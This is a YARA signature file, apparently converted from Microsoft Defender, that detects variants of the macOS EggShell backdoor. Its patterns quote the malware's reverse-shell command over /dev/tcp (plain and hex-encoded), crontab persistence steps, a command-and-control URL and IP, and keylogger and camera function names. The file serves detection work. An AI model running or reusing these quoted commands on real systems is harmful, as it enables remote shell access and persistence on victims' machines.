rule Backdoor_MacOS_EggShell_A_2147745381_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/EggShell.A!MTB"
        threat_id = "2147745381"
        type = "Backdoor"
        platform = "MacOS: "
        family = "EggShell"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6b 69 6c 6c 61 6c 6c 20 [0-8] 3b 65 63 68 6f 20 27 25 40 27 20 7c 20 73 75 64 6f 20 2d 53 20 62 61 73 68 20 26 3e 20 2f 64 65 76 2f 74 63 70 2f 25 40 2f 25 64 20 30 3e 26 31 20 32 3e 2f 64 65 76 2f 6e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = "fuck %d" ascii //weight: 1
        $x_1_3 = "/tmp/.avatmp" ascii //weight: 1
        $x_1_4 = "problems getting password" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_MacOS_EggShell_D_2147748005_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/EggShell.D!MTB"
        threat_id = "2147748005"
        type = "Backdoor"
        platform = "MacOS: "
        family = "EggShell"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "eyJkZWJ1ZyI6IGZhbHNlLCAiaXAiOiAiOTMuMTcwLjc2LjE3OSIsICJwb3J0IjogMjI4MX0" ascii //weight: 2
        $x_1_2 = "screen.info.swtest.ru/knock.php" ascii //weight: 1
        $x_1_3 = "moimz/CoinTicker/master/coins.plist" ascii //weight: 1
        $x_1_4 = "isBtcMarket" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_MacOS_EggShell_C_2147778122_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/EggShell.C!MTB"
        threat_id = "2147778122"
        type = "Backdoor"
        platform = "MacOS: "
        family = "EggShell"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {49 89 d6 4c 8d 3d ?? ?? ?? ?? 4c 89 ff e8 ?? ?? ?? ?? 48 85 db 7e 24 48 89 c1 be 01 00 00 00 31 ff 48 8d 04 1f 48 99 48 f7 f9 42 8a 04 3a 41 30 04 3e 89 f7 ff c6 48 39 df 7c e6 48 83 c4 08}  //weight: 2, accuracy: Low
        $x_1_2 = {44 89 e0 4c 69 f8 4f ec c4 4e 49 c1 ef 23 43 8d 04 bf 8d 04 80 44 01 f8 f7 d8 45 8d 44 04 61 48 8b 75 ?? 48 8d 15}  //weight: 1, accuracy: Low
        $x_1_3 = "/.update" ascii //weight: 1
        $x_1_4 = "obfuscateBashShell:" ascii //weight: 1
        $x_1_5 = "KeylogThread" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_MacOS_EggShell_A_2147817557_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/EggShell.A!xp"
        threat_id = "2147817557"
        type = "Backdoor"
        platform = "MacOS: "
        family = "EggShell"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/dev/tcp/%@/%d 0>&1 2>/dev/null' >> /private/tmp/.cryon" ascii //weight: 1
        $x_1_2 = "fuck %d" ascii //weight: 1
        $x_1_3 = "sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null" ascii //weight: 1
        $x_1_4 = "crontab -l > /private/tmp/.cryon" ascii //weight: 1
        $x_1_5 = "EggShell/src/esplosx/esplosx/espl.h" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_MacOS_EggShell_G_2147849542_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/EggShell.G!MTB"
        threat_id = "2147849542"
        type = "Backdoor"
        platform = "MacOS: "
        family = "EggShell"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/tmp/.avatmp" ascii //weight: 1
        $x_1_2 = "launchagents/.espl.plist" ascii //weight: 1
        $x_1_3 = "getfullcmd" ascii //weight: 1
        $x_1_4 = "takepicture" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

